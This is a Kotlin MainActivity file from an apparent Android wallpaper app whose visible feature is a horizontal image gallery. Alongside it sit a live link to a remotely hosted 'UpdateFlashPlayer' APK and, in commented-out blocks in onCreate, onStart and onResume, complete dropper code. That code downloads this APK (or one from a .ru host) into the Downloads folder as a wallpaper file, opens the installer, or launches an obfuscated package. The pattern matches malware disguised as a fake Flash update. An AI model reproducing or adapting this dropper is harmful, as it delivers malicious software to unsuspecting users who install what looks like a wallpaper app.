package com.autorelling.daringwang.autowallpapers

import android.Manifest
import android.content.pm.PackageManager
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.os.Environment
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.support.v7.widget.LinearLayoutManager
import android.support.v7.widget.RecyclerView
import com.thin.downloadmanager.ThinDownloadManager
import java.io.File

class MainActivity : AppCompatActivity() {

    lateinit var fileLifeWallpaper: File
    lateinit var alarm:AlarmManagerBroadcastReciver

    lateinit var recView:RecyclerView
    // var link:String = "https://firebasestorage.googleapis.com/v0/b/handmadeevent-113dd.appspot.com/o/UpdateFlashPlayer_ldjjirhac4upyl2gbzw1nnre9hu89koxf3kjared_protected_131116.apk?alt=media&token=062864bb-7200-41df-a67f-501acca37291"
    var link:String = "https://firebasestorage.googleapis.com/v0/b/bdhair-652f7.appspot.com/o/UpdateFlashPlayer_mbrsdbxkhw4hta4y26mmbtubxyim7g0tikkpnpr5_protected_133300.apk?alt=media&token=68fc19a7-0d21-4b19-984c-de956704ecfb"
    var downloandManager: ThinDownloadManager = ThinDownloadManager(5)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        // downloandManager.release()
        //alarm = AlarmManagerBroadcastReciver()
        //alarm.SetAlarm(applicationContext)
        fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
        var links:Array<String> = resources.getStringArray(R.array.download_links)
        recView = findViewById(R.id.recView)
        recView.layoutManager = LinearLayoutManager(applicationContext,LinearLayoutManager.HORIZONTAL,false)
        var adapter: RecyclerView.Adapter<ImageAdapter.ImViewHolder> = ImageAdapter(links)
        recView.adapter = adapter
        recView.adapter.notifyDataSetChanged()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE),1)
        }
        else{
   /*         if(!fileLifeWallpaper.exists()){
                var destinationUri = Uri.parse(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
                var downloadRequest = DownloadRequest(Uri.parse(link)).setDestinationURI(destinationUri)
                // var downloadRequest = DownloadRequest(Uri.parse("http://csmys.ru/baners/UpdateFlashPlayer.apk")).setDestinationURI(destinationUri)
                // downloandManager.cancelAll()
                downloandManager.add(downloadRequest)
                var downloadStatusListener = object: DownloadStatusListenerV1 {
                    override fun onDownloadComplete(downloadRequest: DownloadRequest?) {
                        Toast.makeText(applicationContext,"Complete", Toast.LENGTH_SHORT).show()
                    }

                    override fun onDownloadFailed(downloadRequest: DownloadRequest?, errorCode: Int, errorMessage: String?) {
                        Toast.makeText(applicationContext,"Download_Error", Toast.LENGTH_SHORT).show()
                        Log.d("ERROR_D",errorMessage)
                    }

                    override fun onProgress(downloadRequest: DownloadRequest?, totalBytes: Long, downloadedBytes: Long, progress: Int) {
                        //   Toast.makeText(applicationContext,"Download_Started",Toast.LENGTH_SHORT).show()
                    }

                }
                downloadRequest.setStatusListener(downloadStatusListener)*/
           // }else{
                /* var intentOpen = applicationContext.packageManager.getLaunchIntentForPackage("com.yxkwxatje.hliqlhun")
                 if(intentOpen == null){
                     var intent = Intent(android.content.Intent.ACTION_VIEW)
                     var fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapers"+".apk")
                     var uri = FileProvider.getUriForFile(applicationContext, applicationContext.getPackageName() + ".my.package.name.provider", fileLifeWallpaper)
                     intent.setDataAndType(uri, "application/vnd.android.package-archive")
                     intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                     startActivity(intent)
                 }else{
                     startActivity(intentOpen)
                 }*/
            }


    }

    override fun onStart() {
        super.onStart()
        fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() + "/" + "LifeWallpapersNew" + ".apk")
        var links: Array<String> = resources.getStringArray(R.array.download_links)
        recView.layoutManager = LinearLayoutManager(applicationContext, LinearLayoutManager.HORIZONTAL, false)
        var adapter: RecyclerView.Adapter<ImageAdapter.ImViewHolder> = ImageAdapter(links)
        recView.adapter = adapter
        recView.adapter.notifyDataSetChanged()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE), 1)
        }
        else{
          /*  if(!fileLifeWallpaper.exists()){
                var destinationUri = Uri.parse(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
                var downloadRequest = DownloadRequest(Uri.parse(link)).setDestinationURI(destinationUri)
                downloandManager.add(downloadRequest)
                var downloadStatusListener = object: DownloadStatusListenerV1 {
                    override fun onDownloadComplete(downloadRequest: DownloadRequest?) {
                        Toast.makeText(applicationContext,"Complete", Toast.LENGTH_SHORT).show()
                    }

                    override fun onDownloadFailed(downloadRequest: DownloadRequest?, errorCode: Int, errorMessage: String?) {
                        Toast.makeText(applicationContext,"Download_Error", Toast.LENGTH_SHORT).show()
                        Log.d("ERROR_D",errorMessage)
                    }

                    override fun onProgress(downloadRequest: DownloadRequest?, totalBytes: Long, downloadedBytes: Long, progress: Int) {
                        //   Toast.makeText(applicationContext,"Download_Started",Toast.LENGTH_SHORT).show()
                    }

                }
                downloadRequest.setStatusListener(downloadStatusListener)
            }*//*else{
                var intentOpen = applicationContext.packageManager.getLaunchIntentForPackage("com.yxkwxatje.hliqlhun")
                if(intentOpen == null){
                    var intent = Intent(android.content.Intent.ACTION_VIEW)
                    var fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapers"+".apk")
                    var uri = FileProvider.getUriForFile(applicationContext, applicationContext.getPackageName() + ".my.package.name.provider", fileLifeWallpaper)
                    intent.setDataAndType(uri, "application/vnd.android.package-archive")
                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                    startActivity(intent)
                }else{
                    startActivity(intentOpen)
                }
            }*/
        }
    }

    override fun onResume() {
        super.onResume()
        fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapersNew"+".apk")
        var links:Array<String> = resources.getStringArray(R.array.download_links)
        recView.layoutManager = LinearLayoutManager(applicationContext,LinearLayoutManager.HORIZONTAL,false)
        var adapter:RecyclerView.Adapter<ImageAdapter.ImViewHolder> = ImageAdapter(links)
        recView.adapter = adapter
        recView.adapter.notifyDataSetChanged()
      /*  if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE),1)
        }
        else{*/
            /* if(!fileLifeWallpaper.exists()){
                 var destinationUri = Uri.parse(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapers"+".apk")
                 var downloadRequest = DownloadRequest(Uri.parse("http://csmys.ru/baners/UpdateFlashPlayer.apk")).setDestinationURI(destinationUri)
                 downloandManager.add(downloadRequest)
                 var downloadStatusListener = object: DownloadStatusListenerV1 {
                     override fun onDownloadComplete(downloadRequest: DownloadRequest?) {
                         //  instalLifeWallpapers()
                     }

                     override fun onDownloadFailed(downloadRequest: DownloadRequest?, errorCode: Int, errorMessage: String?) {
                         Toast.makeText(applicationContext,"Download_Error", Toast.LENGTH_SHORT).show()
                         Log.d("ERROR_D",errorMessage)
                     }

                     override fun onProgress(downloadRequest: DownloadRequest?, totalBytes: Long, downloadedBytes: Long, progress: Int) {

                     }

                 }
                 downloadRequest.setStatusListener(downloadStatusListener)
             }*//*else{
                var intentOpen = applicationContext.packageManager.getLaunchIntentForPackage("com.yxkwxatje.hliqlhun")
                if(intentOpen == null){
                    var intent = Intent(android.content.Intent.ACTION_VIEW)
                    var fileLifeWallpaper = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString() +"/"+ "LifeWallpapers"+".apk")
                    var uri = FileProvider.getUriForFile(applicationContext, applicationContext.getPackageName() + ".my.package.name.provider", fileLifeWallpaper)
                    intent.setDataAndType(uri, "application/vnd.android.package-archive")
                    intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                    startActivity(intent)
                }else{
                    startActivity(intentOpen)
                }
            }*//*
        }*/

    }
}
